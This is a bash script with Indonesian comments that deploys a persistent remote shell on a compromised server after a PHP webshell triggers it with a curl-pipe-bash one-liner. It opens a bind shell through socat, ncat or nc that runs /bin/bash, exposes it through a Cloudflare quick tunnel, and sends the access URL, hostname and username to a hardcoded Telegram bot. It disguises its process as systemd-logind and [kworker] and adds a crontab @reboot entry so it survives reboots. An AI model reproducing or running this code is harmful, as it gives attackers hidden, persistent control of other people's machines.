#!/usr/bin/env bash
# Cloudflare Tunnel Reverse Shell - One-liner deploy via PHP webshell
# Usage (from PHP): system('bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"');
# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL ...)"

# Konfigurasi
: "${HOME:=/tmp}"
: "${USER:=$(whoami 2>/dev/null || echo unknown)}"
: "${UID:=$(id -u 2>/dev/null || echo 0)}"

# Telegram (hardcode)
TG_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
TG_CHATID="6223261018"

BIN_NAME="systemd-logind"
PROC_NAME="[kworker]"
CONFIG_DIR=".config/dbus"
URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
TMPDIR="/tmp/.cf-${UID}"
PORT=$((RANDOM % 40000 + 10000))

set -euo pipefail

# ---------- Fungsi ----------
log() { echo -e "[*] $*" >&2; }
err()  { echo -e "[!] $*" >&2; exit 1; }

# Kirim pesan ke Telegram
send_tg() {
    local url="$1"
    local msg="✅ Reverse shell: ${url}%0AHost: $(hostname)%0AUser: ${USER}%0APort: ${PORT}"
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
        -d "chat_id=${TG_CHATID}&text=${msg}" >/dev/null 2>&1 || true
}

# Deteksi arsitektur
detect_arch() {
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    [[ "$os" == "linux" ]] || [[ "$os" == "darwin" ]] || err "Unsupported OS: $os"
    case "$arch" in
        x86_64|amd64) echo "linux-amd64" ;;
        aarch64|arm64) echo "linux-arm64" ;;
        armv7l)        echo "linux-arm" ;;
        i386|i686)     echo "linux-386" ;;
        *) err "Unsupported arch: $arch" ;;
    esac
}

# Download cloudflared
download_cf() {
    local arch="$1"
    local url="${URL_BASE}/cloudflared-${arch}"
    local out="$TMPDIR/cloudflared"
    log "Downloading cloudflared for ${arch}..."
    curl -fsSL -o "$out" "$url" || err "Download failed"
    chmod 755 "$out"
    echo "$out"
}

# Jalankan bind shell (socat/ncat/nc)
start_bindshell() {
    local port="$1"
    local cmd
    if command -v socat >/dev/null; then
        cmd="socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    elif command -v ncat >/dev/null; then
        cmd="ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
    elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
        cmd="nc -l -p ${port} -e /bin/bash"
    else
        cmd="bash -c 'while true; do nc -l -p ${port} -e /bin/bash 2>/dev/null; done'"
    fi
    nohup sh -c "$cmd" &>/dev/null &
    echo $!
}

# Jalankan tunnel (tersembunyi) dan tangkap URL
start_tunnel() {
    local port="$1"
    local bin="$2"
    local url_file="$3"
    ( exec -a "$PROC_NAME" "$bin" tunnel --url "tcp://localhost:${port}" ) 2>&1 | while IFS= read -r line; do
        if [[ "$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
            url="${BASH_REMATCH[0]}"
            echo "$url" > "$url_file"
            echo -e "\n✅ TUNNEL URL: $url" >&2
            send_tg "$url"
        fi
        echo "$line" >> "$TMPDIR/cloudflared.log"
    done &
    echo $!
}

# Pasang persistence via crontab
install_persistence() {
    local bin_path="$1"
    local port="$2"
    local script_path="${HOME}/${CONFIG_DIR}/cf_tunnel.sh"
    mkdir -p "${HOME}/${CONFIG_DIR}"
    cat > "$script_path" <<EOF
#!/bin/bash
while true; do
    exec -a "$PROC_NAME" "$bin_path" tunnel --url "tcp://localhost:${port}" 2>&1 | while IFS= read -r line; do
        if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
            url="\${BASH_REMATCH[0]}"
            echo "\$url" > "$TMPDIR/tunnel.url"
            curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
                -d "chat_id=${TG_CHATID}&text=✅ Reverse shell restarted: \${url}%0AHost: \$(hostname)%0AUser: ${USER}" >/dev/null 2>&1
        fi
        echo "\$line" >> "$TMPDIR/cloudflared.log"
    done
    sleep 10
done
EOF
    chmod 755 "$script_path"
    # Hapus entri lama lalu tambah baru
    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
    (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
    log "Persistence via crontab installed."
}

# Uninstall
uninstall() {
    log "Uninstalling..."
    pkill -f "$BIN_NAME" 2>/dev/null || true
    pkill -f "$PROC_NAME" 2>/dev/null || true
    pkill -f "cf_tunnel.sh" 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
    rm -rf "${HOME}/${CONFIG_DIR}" "$TMPDIR"
    log "Uninstall complete."
    exit 0
}

# ---------- MAIN ----------
[[ -n "${GS_UNDO:-}" ]] && uninstall

# Bersihkan proses lama
pkill -f "$BIN_NAME" 2>/dev/null || true
pkill -f "$PROC_NAME" 2>/dev/null || true
pkill -f "cf_tunnel.sh" 2>/dev/null || true
sleep 1

rm -rf "$TMPDIR" 2>/dev/null || true
mkdir -p "$TMPDIR"

# Download binary
arch=$(detect_arch)
cf_bin=$(download_cf "$arch")

# Pindahkan ke direktori persisten
INSTALL_DIR="${HOME}/${CONFIG_DIR}"
mkdir -p "$INSTALL_DIR"
cp "$cf_bin" "$INSTALL_DIR/$BIN_NAME"
chmod 755 "$INSTALL_DIR/$BIN_NAME"
cf_bin="$INSTALL_DIR/$BIN_NAME"

# Start bind shell
log "Starting bind shell on port $PORT..."
bind_pid=$(start_bindshell "$PORT")
sleep 1

# Start tunnel
log "Starting Cloudflare tunnel..."
url_file="$TMPDIR/tunnel.url"
tunnel_pid=$(start_tunnel "$PORT" "$cf_bin" "$url_file")
sleep 5

# Tampilkan URL (jika berhasil)
if [[ -f "$url_file" ]]; then
    url=$(cat "$url_file")
    log "Tunnel URL: $url"
else
    log "Failed to get tunnel URL. Check $TMPDIR/cloudflared.log"
fi

# Install persistence (opsional, set GS_NOINST=1 untuk skip)
[[ -z "${GS_NOINST:-}" ]] && install_persistence "$cf_bin" "$PORT"

log "Done. Use GS_UNDO=1 to uninstall."
